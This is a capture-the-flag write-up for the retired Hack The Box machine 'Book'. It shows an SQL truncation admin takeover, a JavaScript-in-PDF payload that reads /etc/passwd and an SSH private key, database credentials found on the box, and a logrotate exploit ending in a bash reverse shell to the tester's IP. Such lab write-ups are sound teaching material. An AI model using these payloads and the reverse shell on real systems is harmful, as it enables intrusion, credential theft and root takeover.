# Book

This is the write-up for the box Book that got retired at the 11th July 2020.
My IP address was 10.10.14.7 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.176    book.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/book.nmap 10.10.10.176
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The homepage is on _index.php_ and is a login form to some application:

![Login form](book_web-1.png)

By clicking on _Sign Up_ and using any information, it is possible to _Sign In_ and get forwarded to _home.php_.

![Library homepage](book_web-2.png)

On this page is a menu with the following pages:
- _books.php_
- _search.php_
- _feedback.php_
- _collections.php_
- _contact.php_
- _profile.php_
- _settings.php_

The images on _books.php_ forward to _download.php_ and _contact.php_ shows a potential username called _admin[@]book.htb_.
There is also a page on _/admin_ that has a different login page:

![Admin Sign In](book_web-3.png)

After trying out different Web vulnerabilities like **SQL Injection** and **XSS**, none of the input fields of the pages resolve in errors.
This means the _Sign In / Sign Up_ page should be focused and the _admin_ user could be taken over somehow.

In the HTML source code of _index.php_ on the login form is some JavaScript that says that the username should not be more than 20 characters:
```
(...)
alert("Please fill name field. Should not be more than 10 characters");
return false;

if (y == "") {
alert("Please fill email field. Should not be more than 20 characters");
return false;
(...)
```

The username can be duplicates, but the email address has to be unique on the login form.
The username _admin[@]book.htb_ has 14 characters, so by adding 6 blank characters and 1 random letter at the end, it may truncate the 21st letter and ignore all the whitespaces.
This method is called **SQL Truncation** and could result in successful login with the admin user.

Creating username _admin[@]book.htb++++++1_ _(the plus symbol is used to symbolize spaces)_:
```
POST /index.php HTTP/1.1
Host: 10.10.10.176
(...)

name=test1&email=admin%40book.htb      1&password=Test123
```

Now the login with _admin[@]book.htb_ and the given password works, as the whitespaces get truncated.
The login also works on the _/admin_ page:

![Library Admin Panel](book_web-4.png)

### Exploiting Admin Panel

In the _Collections_ menu are two PDFs that can be downloaded.
One shows the existing users and the other one the collections on the web application.

I changed the username of the initially created user to `"<b>test<\b>"` to see if it processes HTML syntax.
It does not process it on the web page, but the PDF creation tool does and shows the username in bold letters:

![Users PDF export](book_web-5.png)

As the usernames have a character limit, we can create a malicious _Collection_ to inject **JavaScript** code into the PDF creation tool.

Creating a new _Collection_ with JavaScript in the book title:
```
Book Title: <script> x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open("GET","file:///etc/passwd");x.send(); </script>
```

![Creating new Collection](book_web-6.png)

After exporting the Collection PDF with the _admin_, the contents of the PDF are all users from _/etc/passwd_, which proofs that reading local files is possible:
```
root:x:0:0:root:/root:/bin/bash
(...)
reader:x:1000:1000:reader:/home/reader:/bin/bash
```

The only user with a shell set is _reader_, so lets try to guess the name of the SSH key and display the contents:
```
<script> x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open("GET","file:///home/reader/.ssh/id_rsa");x.send(); </script>
```

Now we got the SSH key of _reader_ and as it is incorrectly formatted, the **pdftohtml** tool is able to format it correctly:
```
pdftohtml 5889.pdf
```

The string has to be copied into a new file and can be formatted with **Vim** or any other text editor:
```
vim reader_id.rsa

:%s/<br\/>/\r/g
```
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
(...)
-----END RSA PRIVATE KEY-----
```
```
chmod 600 reader_id.rsa
```

Now the SSH key is usable to login to the box as _reader_:
```
ssh -i reader_id.rsa reader@10.10.10.176
```

## Privilege Escalation

In the home directory of _reader_ in _/home/reader_ is a writable log file in _backups/access.log.1_ with the following content:
```
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```

There is also a bash script called _lse.sh_ which is the [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) tool.
The file _/var/www/html/db.php_ contains credentials for the **MySQL** database, that could be useful:
```
$conn = mysqli_connect("localhost","book_admin","I_Hate_Book_Reading","book");
(...)
```

After running **LinPeas** to enumerate the box more, it shows that **logrotate** runs on it and the _backups/access.log.1_ is a writable log file to exploit a [Logrotate Vulnerability](https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation).

This vulnerability works only when a user logs in, but the `last` command shows, that root is constantly login in.
We can use the [logrotten exploit on GitHub](https://github.com/whotwagner/logrotten), that has to be uploaded to the box and then compiled there:
```
gcc logrotten.c -o logrotten

./logrotten
```

Creating the reverse shell payload bash script _(shell.sh_):
```
bash -i >& /dev/tcp/10.10.14.7/9001 0>&1
```

Forcing _access.log_ to rotate and executing **logrotten** with the reverse shell payload:
```
cp /home/reader/backups/access.log.1 /home/reader/backups/access.log; ./logrotten -p shell.sh /home/reader/backups/access.log
```

After the next root login, the listener on my IP and port 9001 starts a shell session as root!
